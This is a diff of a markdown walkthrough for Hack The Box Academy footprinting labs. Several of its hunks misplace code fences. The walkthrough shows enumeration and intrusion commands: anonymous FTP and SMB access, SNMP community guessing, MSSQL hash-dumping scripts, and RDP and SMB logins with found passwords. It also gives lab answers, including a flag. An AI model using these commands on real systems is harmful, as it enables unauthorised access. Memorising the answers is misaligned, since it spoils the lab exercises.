@@ -100,7 +100,7 @@ contents of it as the answer.
 Answer: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}
 Method: we will initiate anonymous login to the server, lets start by connection
 to the ftp server using the command:
-ftp <target-IP>
+`ftp <target-IP>`
 
 
 We are requested to enter credentials (which we do not have), so we will use
@@ -194,7 +194,7 @@ There are few workarounds:
 Method 1: we can use the following script:
 #!/bin/bash
 
-TARGET="//<target-IP>"
+TARGET="//`<target-IP>`"
 SHARES=$(smbclient -N -L $TARGET | grep 'Disk' | awk '{print
 $1}')
 
@@ -211,9 +211,9 @@ smbclient -N -c exit $TARGET/$SHARE &> /dev/null
 if [ $? -eq 0 ]; then
 ```bash
 echo "Accessible: $SHARE"
-```
 else
 ```bash
+```
 echo "Not accessible: $SHARE"
 ```
 fi
@@ -240,9 +240,9 @@ not a share), sambashare is accessible.)
 #### Technical Methodology & Exploit Execution:
 
 lets login to the accessible share with the command:
-```bash
-smbclient //<target-IP>/sambashare -N
+smbclient //`<target-IP>`/sambashare -N
 ```
+```bash
 in anonymous manner ('-N'):
 
 When we entered the sambashare, we entered 'ls' to see what  we can find,
@@ -390,8 +390,8 @@ sudo mkdir -p /mnt/nfs/mnt_nfsshare
 
 ```bash
 sudo mount -t nfs <target-IP>:/mnt/nfsshare
-```
 /mnt/nfs/mnt_nfsshare
+```
 
 ```bash
 ls -la /mnt/nfs/mnt_nfsshare
@@ -511,7 +511,7 @@ error).
 
 dnsrecon -d dev.inlanefreight.htb -D
 /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -t brt
--n <target-IP>
+-n `<target-IP>`
 
 
 we can see the FQDN whose IP's last octet is 203 – is
@@ -671,7 +671,7 @@ curl -k 'pop3://<target-IP>' --user robin:robin -v
 #### Technical Methodology & Exploit Execution:
 
 first, lets login to the ssl port (993) of 'imaps':
-openssl s_client -connect <target-IP>:993
+openssl s_client -connect `<target-IP>`:993
 
 
 *
@@ -727,8 +727,8 @@ here.
 When both are ready, we will run the 'onesixtyone' with the command:
 ```bash
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt
+`<target-IP>`
 ```
-<target-IP>
 
 
 We can observe that the word 'public' is a valid community string, successfully
@@ -806,7 +806,7 @@ address of the customer "Otto Lang"?
 Answer: ultrices@google.htb
 Method: first, lets connect to the myself service in the target machine using
 the provided credential with the command:
-mysql -h <target-IP> -u robin -probin
+`mysql -h <target-IP> -u robin -probin`
 
 ![Figure 22.1 — Lab execution and output verification (Page 22)](/assets/images/posts/htb-academy/footprinting/p022_01.jpg)
 *_Figure 22.1 — Lab execution and output verification (Page 22)_*
@@ -876,13 +876,12 @@ and we will find the hostname in the ntlm-info scan:
 
 *the command is a more focused version of the full scan:
 ```bash
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-
-```
-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-
 sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args
+```
 mssql.instance-
 port=1433,mssql.username=sa,mssql.password=,mssql.instance-
-name=MSSQLSERVER -sV -p 1433 <target-IP>
+name=MSSQLSERVER -sV -p 1433 `<target-IP>`
 which its output will not be displayed here. *
 
 ![Figure 25.1 — Lab execution and output verification (Page 25)](/assets/images/posts/htb-academy/footprinting/p025_01.jpg)
@@ -904,8 +903,8 @@ we will use the impacket tool 'mssqlclient.py'  located in
 connect to the mssql server with the command:
 ```bash
 python3 /usr/local/bin/mssqlclient.py backdoor@<target-IP> -
-```
 windows-auth
+```
 enter the provided password to the password prompt, and we are in:
 
 
@@ -1033,7 +1032,7 @@ requested to use a key:
 
 #### Technical Methodology & Exploit Execution:
 
-ftp <target-IP> 2121
+`ftp <target-IP> 2121`
 and enter the credentials:
 
 ![Figure 30.1 — Lab execution and output verification (Page 30)](/assets/images/posts/htb-academy/footprinting/p030_01.jpg)
@@ -1189,9 +1188,8 @@ the relevant part of the file's content is this:
 There are credentials of the user alex -  alex:lol123!mD.
 Lets attempt to RDP to his user:
 ```bash
-xfreerdp /v:<target-IP> /u:alex /p:'lol123!mD' /dynamic-
+xfreerdp /v:<target-IP> /u:alex /p:'lol123!mD' /dynamic-resolution
 ```
-resolution
 
 
 We are in! And we have Microsoft SQL (MSSQL) installed, its open it:
@@ -1216,8 +1214,8 @@ username already set, however we need the password.
 Lets use alex's credentials to access to the smb server:
 ```bash
 crackmapexec smb <target-IP> --shares -u 'alex' -p
-```
 'lol123!mD'
+```
 
 
 Ok so there are shares that alex may read, one of them is 'devshare' – lets
@@ -1257,8 +1255,8 @@ Login failed… it seems the password doesn't works here.
 Instead – lets try to use the password for the Administrator account:
 ```bash
 xfreerdp /v:<target-IP> /u:Administrator /p:'87N1ns@slls83'
-```
 /dynamic-resolution
+```
 
 
 We are in, and we have here the MSSQL installed as well. Lets open it:
@@ -1357,8 +1355,8 @@ here.
 
 ```bash
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt
+`<target-IP>`
 ```
-<target-IP>
 
 
 The enumeration found the community string 'backup' (along with OS
@@ -1400,7 +1398,7 @@ Lets try to use the credentials on imap/pop3:
 
 ### We will go for his 'INBOX' list
 
-openssl s_client -connect <target-IP>:imaps
+openssl s_client -connect `<target-IP>`:imaps
 
 
 *
